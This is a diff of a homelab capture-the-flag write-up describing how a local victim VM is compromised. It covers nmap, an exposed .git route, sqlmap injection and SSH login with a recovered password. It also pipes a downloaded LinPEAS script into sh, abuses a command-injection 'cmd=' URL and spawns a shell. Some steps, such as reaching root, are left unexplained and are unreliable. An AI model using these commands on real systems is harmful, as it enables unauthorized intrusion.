@@ -2,7 +2,7 @@
 
 As always, starting my lab with a netdiscover command to see what machines are currently running in my network. I know the **192.168.19.129** IP is the victim machine since the other IPs are my machines that are up and running in a homelab.
 
-screenshot 1
+
 
 I then run a nmap scan to see what ports are open: **nmap -Pn -sS -sC --script vuln 192.168.19.129**. Ports 22 and 80 are open. What's interesting is that there is an exposed route **/.git/** under port 80.
 
@@ -20,13 +20,17 @@ After capturing the HTTP request and then saving it as a file, I can run **sqlma
 
 During the scan, the injections are successful and return two tables, a user table and a ssh table. This worked so I can now ssh into jehad's account. I run the command **ssh jehad@192.168.19.129**, input the password **fool** and I'm in the account.
 
-Now that I have access to an account, it's time for privilege escalation. I switched to the tmp folder and tried to run the Linpeas script: **curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh**. This is a script that searches for potential paths to elevate privileges on Linux hosts and highlights them for a better understanding of those instances with potential exploits. This is my first time using this which was really insightful and I will definitely be using this again in other labs. However, I decided to use metasploit. I used the’s SSH auxiliary module:
+Now that I have access to an account, it's time for privilege escalation. I switched to the tmp folder and tried to run the Linpeas script: **curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh**. This is a script that searches for potential paths to elevate privileges on Linux hosts and highlights them for a better understanding of those instances with potential exploits. This is my first time using this which was really insightful and I will definitely be using this again in other labs. In jehad's account, I eventually got into the losy directory and found one flag shown below:
 
-* msfconsole
-* search ssh type:auxiliary
-* use auxiliary/scanner/ssh/ssh_login
-* set USERNAME jehad
-* set PASSWORD fool
-* set RHOSTS 192.168.19.129
-* run
+
+
+When listing the files in jehad's directory, there is a bash history file which I read and found this which created a reverse shell: **http://127.0.0.1:9999/?cmd=id**
+
+
+
+I encoded this command and got the password to ssh into losy's account:
+
+
+
+I was able to log into losy's account successfully. I create a more interactive shell by running **python3 -c 'import os; os.system("/bin/sh")'**. I then used the whoami command to verify I was in the root user's account. I finally changed the directory I was in to the root directory which I saw the root.txt file was in.
 
